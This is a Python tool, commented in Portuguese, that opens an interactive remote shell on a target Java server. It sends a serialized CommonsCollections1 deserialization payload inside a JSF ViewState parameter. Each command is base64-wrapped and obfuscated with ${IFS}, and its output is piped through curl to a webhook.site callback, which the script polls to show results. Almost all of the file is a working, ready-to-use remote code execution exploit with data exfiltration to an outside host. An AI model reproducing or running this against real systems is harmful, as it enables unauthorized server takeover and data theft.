#!/usr/bin/env python3
# DESCOMENTE A LINHA 83 CASO HAJA API KEY/PLANO PAGO NO WEBHOOK SITE

"""
jexshell.py - Shell interativo JexBoss via webhook.site callback
Uso: python3 jexshell.py <URL_ALVO>
"""

import sys, os, struct, gzip, base64, urllib.parse
import subprocess, time, json, readline, threading
from datetime import datetime, timezone

# ========================== CONFIG ==========================
WEBHOOK_TOKEN = "SEU TOKEN"
WEBHOOK_URL   = f"https://webhook.site/{WEBHOOK_TOKEN}"
WEBHOOK_API   = f"https://webhook.site/token/{WEBHOOK_TOKEN}/requests"
TIMEOUT       = 30
POLL_INTERVAL = 0.2        # polling a cada 0.2s
POLL_MAX_WAIT = 60         # timeout maximo de espera

# ========================== CORES ===========================
RST = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
BLUE = "\033[94m"; CYAN = "\033[96m"; WHITE = "\033[97m"

# ============= GADGET CHAIN CommonsCollections1 =============
_P = (
    "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7"
    "340300007870770c000000023f40000000000001737200346f72672e61706163"
    "68652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e"
    "546965644d6170456e7472798aadd29b39c11fdb0200024c00036b6579740012"
    "4c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a617661"
    "2f7574696c2f4d61703b787074002668747470733a2f2f6769746875622e636f"
    "6d2f6a6f616f6d61746f73662f6a6578626f7373207372002a6f72672e617061"
    "6368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a79"
    "4d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f"
    "6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73"
    "666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e"
    "636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e"
    "73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65"
    "727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c6563"
    "74696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170"
    "616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f"
    "726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170"
    "616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72"
    "732e436f6e7374616e745472616e73666f726d6572587690114102b194020001"
    "4c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e67"
    "2e52756e74696d65000000000000000000000078707372003a6f72672e617061"
    "6368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f7273"
    "2e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b00"
    "0569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b69"
    "4d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b"
    "000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173"
    "733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f10"
    "73296c02000078700000000274000a67657452756e74696d65757200125b4c6a"
    "6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000000"
    "7400096765744d6574686f647571007e001b00000002767200106a6176612e6c"
    "616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b737100"
    "7e00137571007e001800000002707571007e001800000000740006696e766f6b"
    "657571007e001b00000002767200106a6176612e6c616e672e4f626a65637400"
    "0000000000000000000078707671007e00187371007e0013757200135b4c6a61"
    "76612e6c616e672e537472696e673badd256e7e91d7b47020000787000000001"
    "74"
)
_S = (
    "740004657865637571007e001b0000000171007e00207371007e000f73720011"
    "6a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576"
    "616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b"
    "020000787000000001737200116a6176612e7574696c2e486173684d61700507"
    "dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f"
    "6c6478703f4000000000000077080000001000000000787878"
)
_PB = bytes.fromhex(_P)
_SB = bytes.fromhex(_S)


# ==================== HTTP SESSION GLOBAL ====================
import requests as _req
_session = _req.Session()
_session.headers.update({
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
    # "Api-Key": "API KEY"
})
# keep-alive implicito, reutiliza conexao TCP+TLS


def format_output(text):
    """Reformata output que veio sem newlines."""
    import re
    if not text:
        return ""
    if "\n" in text:
        return text.rstrip()
    text = re.sub(r'(?<=[^\n])([dl\-][rwxstSTl\-]{9})', r'\n\1', text)
    text = re.sub(r'(?<=[^\n])(total\s+\d)', r'\n\1', text)
    text = re.sub(r'(/(?:bin|sbin)/(?:nologin|false|bash|sh|sync|halt|shutdown|csh|tcsh|zsh|ksh|fish|dash))(?=[a-zA-Z_+])', r'\1\n', text)
    return text.strip()


def get_domain(url):
    try:
        return url.split("//")[1].split("/")[0]
    except:
        return url


def gerar_payload(cmd):
    """
    Gera payload ViewState com CommonsCollections1 gadget chain.

    FIX: Usa base64 para encapsular o comando inteiro, evitando que
    caracteres especiais (;, |, &&, >, etc.) quebrem o escopo do bash -c.

    Antes (BUGADO):
        /bin/bash -c uname${IFS}-a;uptime${IFS}|${IFS}curl...
        → O ; quebra o bash -c, só o uptime vai pro pipe/curl.

    Agora (CORRIGIDO):
        /bin/bash -c eval${IFS}$(echo${IFS}BASE64|base64${IFS}-d)${IFS}|${IFS}curl...
        → O comando inteiro é decodificado e executado como uma unidade.
    """
    ifs = "${IFS}"

    # Codifica o comando inteiro em base64 para preservar ;, |, &&, etc.
    cmd_b64 = base64.b64encode(cmd.encode()).decode()

    # Monta: /bin/bash -c eval${IFS}$(echo${IFS}BASE64|base64${IFS}-d)${IFS}|${IFS}curl${IFS}--data-binary${IFS}@-${IFS}WEBHOOK
    # O eval$(...) decodifica e executa o comando, o pipe envia stdout pro curl
    shell = (
        f"/bin/bash -c "
        f"eval{ifs}$(echo{ifs}{cmd_b64}|base64{ifs}-d)"
        f"{ifs}|{ifs}curl{ifs}--data-binary{ifs}@-{ifs}{WEBHOOK_URL}"
    )

    cb = shell.encode("utf-8")
    obj = _PB + struct.pack(">H", len(cb)) + cb + _SB
    gz = gzip.compress(obj)
    b64 = base64.b64encode(gz).decode()
    return "javax.faces.ViewState=" + urllib.parse.quote(b64, safe="")


def disparar(url, body):
    """Dispara payload via curl (mantido pra compatibilidade com headers exatos)."""
    cmd = [
        "curl", "--compressed", "-s", "-o", "/dev/null", "-w", "%{http_code}",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
        "-X", "POST", "-d", body, "--max-time", str(TIMEOUT), "-k", url,
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT + 5)
        return proc.stdout.strip()
    except:
        return None


# ==================== MONITOR RAPIDO ====================

class WebhookMonitor:
    """
    Monitor persistente que roda em background.
    - Usa requests.Session com keep-alive (conexao TCP reutilizada)
    - Salva o timestamp do ultimo request visto
    - Polling a cada 0.5s comparando created_at
    - Quando detecta novo, coloca na fila instantaneamente
    """

    def __init__(self, token):
        self.token = token
        self.api_url = f"https://webhook.site/token/{token}/requests"
        self.raw_url = f"https://webhook.site/token/{token}/request"
        self.session = _session

        # estado
        self._last_uuid = None          # UUID do ultimo request visto
        self._last_created = None       # timestamp do ultimo request visto
        self._result = None             # resultado capturado
        self._event = threading.Event() # sinaliza quando resultado pronto
        self._monitoring = False
        self._thread = None
        self._stop = threading.Event()

    def _fetch_newest(self):
        """Busca o request mais recente via API (1 request HTTP, ~50ms)."""
        try:
            resp = self.session.get(
                self.api_url,
                params={"sorting": "newest", "per_page": 1, "page": 1},
                timeout=5
            )
            data = resp.json()
            items = data.get("data", [])
            if items:
                return items[0]
        except:
            pass
        return None

    def _fetch_raw(self, uuid):
        """Busca conteudo raw de um request (preserva newlines)."""
        try:
            resp = self.session.get(
                f"{self.raw_url}/{uuid}/raw",
                timeout=5
            )
            return resp.text
        except:
            return None

    def snapshot_latest(self):
        """
        Tira 'foto' do estado atual — salva UUID e timestamp do ultimo request.
        Chamar ANTES de disparar o payload.
        """
        newest = self._fetch_newest()
        if newest:
            self._last_uuid = newest.get("uuid", "")
            self._last_created = newest.get("created_at", "")
        else:
            self._last_uuid = None
            self._last_created = None

    def start_watching(self):
        """Inicia thread de monitoramento em background."""
        self._result = None
        self._event.clear()
        self._stop.clear()
        self._monitoring = True
        self._thread = threading.Thread(target=self._poll_loop, daemon=True)
        self._thread.start()

    def _poll_loop(self):
        """Loop de polling rapido — roda na thread."""
        while not self._stop.is_set():
            newest = self._fetch_newest()
            if newest:
                uuid = newest.get("uuid", "")
                created = newest.get("created_at", "")

                # detecta novo: UUID diferente do snapshot
                if uuid and uuid != self._last_uuid:
                    # tenta raw primeiro (preserva newlines)
                    raw = self._fetch_raw(uuid)
                    if raw and raw.strip():
                        self._result = raw
                    else:
                        self._result = newest.get("content", "")

                    # atualiza snapshot pro proximo comando
                    self._last_uuid = uuid
                    self._last_created = created
                    self._event.set()
                    return

            self._stop.wait(POLL_INTERVAL)  # sleep interruptivel

    def wait_result(self, timeout=POLL_MAX_WAIT):
        """Bloqueia ate resultado chegar ou timeout."""
        got_it = self._event.wait(timeout=timeout)
        self._stop.set()  # para a thread
        self._monitoring = False
        if got_it and self._result is not None:
            return self._result
        return None


def main():
    if len(sys.argv) < 2:
        print(f"Uso: python3 {sys.argv[0]} <URL_ALVO>")
        sys.exit(1)

    target = sys.argv[1].strip()
    domain = get_domain(target)

    print(f""" 
{RED}{BOLD}       ██╗███████╗██╗  ██╗{YELLOW}███████╗██╗  ██╗███████╗██╗     ██╗     
{RED}       ██║██╔════╝╚██╗██╔╝{YELLOW}██╔════╝██║  ██║██╔════╝██║     ██║     
{RED}       ██║█████╗   ╚███╔╝ {YELLOW}███████╗███████║█████╗  ██║     ██║        v2.0 
{RED}  ██   ██║██╔══╝   ██╔██╗ {YELLOW}╚════██║██╔══██║██╔══╝  ██║     ██║        by Injury
{RED}  ╚█████╔╝███████╗██╔╝ ██╗{YELLOW}███████║██║  ██║███████╗███████╗███████╗
{RED}   ╚════╝ ╚══════╝╚═╝  ╚═╝{YELLOW}╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝{RST}

  {CYAN}Target:{RST}  {WHITE}{target}{RST}
  {CYAN}Webhook:{RST} {WHITE}{WEBHOOK_URL}{RST}
  {CYAN}Timeout:{RST} {WHITE}{TIMEOUT}s{RST}  {CYAN}Poll:{RST} {WHITE}{POLL_INTERVAL}s{RST}  {CYAN}Max wait:{RST} {WHITE}{POLL_MAX_WAIT}s{RST}
""")

    # Inicializa monitor
    monitor = WebhookMonitor(WEBHOOK_TOKEN)

    # Snapshot inicial — salva estado atual do webhook
    print(f"  {DIM}[*] Sincronizando com webhook.site...{RST}", end=" ", flush=True)
    monitor.snapshot_latest()
    if monitor._last_uuid:
        print(f"{GREEN}OK{RST} {DIM}(ultimo: {monitor._last_uuid[:8]}...){RST}")
    else:
        print(f"{GREEN}OK{RST} {DIM}(vazio){RST}")
    print()

    histfile = os.path.expanduser("~/.jexshell_history")
    try: readline.read_history_file(histfile)
    except: pass
    readline.set_history_length(500)

    prompt = f"{RED}{BOLD}jexshell{RST}{DIM}@{RST}{YELLOW}{domain}{RST}{RED}${RST} "

    while True:
        try:
            cmd = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit", "q"):
            break

        # 1) Snapshot do estado atual (1 request rapido)
        monitor.snapshot_latest()

        # 2) Inicia monitor em background ANTES de disparar
        monitor.start_watching()

        # 3) Dispara payload
        t0 = time.time()
        disparar(target, body=gerar_payload(cmd))

        # 4) Espera resultado (monitor ja ta rodando, detecta na hora)
        resp = monitor.wait_result(timeout=POLL_MAX_WAIT)
        elapsed = time.time() - t0

        if resp is not None:
            output = format_output(resp)
            print(output)
        else:
            print(f"{RED}[timeout {elapsed:.1f}s]{RST}")

    try: readline.write_history_file(histfile)
    except: pass


if __name__ == "__main__":
    main()